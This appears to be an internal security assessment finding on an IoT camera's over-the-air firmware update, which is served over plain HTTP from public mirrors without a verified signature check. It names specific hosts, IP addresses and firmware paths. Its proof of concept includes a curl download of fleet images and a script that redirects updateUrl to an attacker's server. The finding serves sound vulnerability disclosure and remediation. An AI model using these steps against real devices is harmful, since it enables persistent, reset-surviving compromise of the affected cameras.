## FW-005: OTA update path served over plaintext HTTP with unverifiable integrity (candidate on current build)

**Severity:** High
**CVSS v3.1 Score:** 8.1 (High)
**CVSS Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
**Category:** CWE-494: Download of Code Without Integrity Check
**Affected Component:** RT-Thread OTA client (`[I/OTA]` pkg v0.2.4) + `updateUrl`/`ota_url` handoff
**Location:** firmware OTA task; OTA host `dl2.naxclow.com` (public IP `43.241.19.58`; legacy content mirror `120.77.233.10/BK7252_P2P_IPC_FW/`)
**Discovery Method:** Dynamic Analysis + firmware acquisition

### Description

Update URLs arrive via the (unsigned) confcheck/getDevInfo answers; the historical download host serves images over **plain HTTP** from world-readable directories (`A9_RELEASE_FW/7252_A9_IPC_2103181543.rbl`). Images are RBL-wrapped AES blobs whose header carries a default-vendor key-string field (`00010203040506070809` @0x40). Boot logs prove OTA failures only trigger "recovery factory firmware" — no lockout. A network attacker (FW-001 primitive) that redirects `updateUrl` to an HTTP server of their choosing delivers an image to the bootloader; whether the current 2025 build additionally requires a signature the attacker cannot forge is **not verified** (matching build not available: newest public image is 2022-02-28, device runs 202503081631) — hence *candidate*, with the mechanism itself verified (paths, transport, format).

### Impact (if signature gate absent)

Persistent full compromise of every device in scope of the DNS/HTTP position: implant below OTA, survives factory reset.

### Proof of Concept

```bash
curl -sO http://120.77.233.10/BK7252_P2P_IPC_FW/A9_RELEASE_FW/7252_A9_IPC_2103181543.rbl  # cleartext fleet images
python3 evidence/exploits/poc03_http_takeover.py rogue 80   # inject updateUrl= http://attacker/…rbl
```

### Remediation

- HTTPS + signed images with version-downgrade protection; burn per-device keys; retire plaintext mirrors.

### Verification

OTA from rogue HTTP URL rejected (signature/TLS failure logged); downgrade blocked.

### References

- CWE-494; RT-Thread OTA doc; uart.log OTA error strings

- **Discovered:** 2026-10-02/03
- **Reported:** n/a (internal assessment)
- **Status:** Open
**Analyst:** Andy (0x3d) — OpenFox assessment
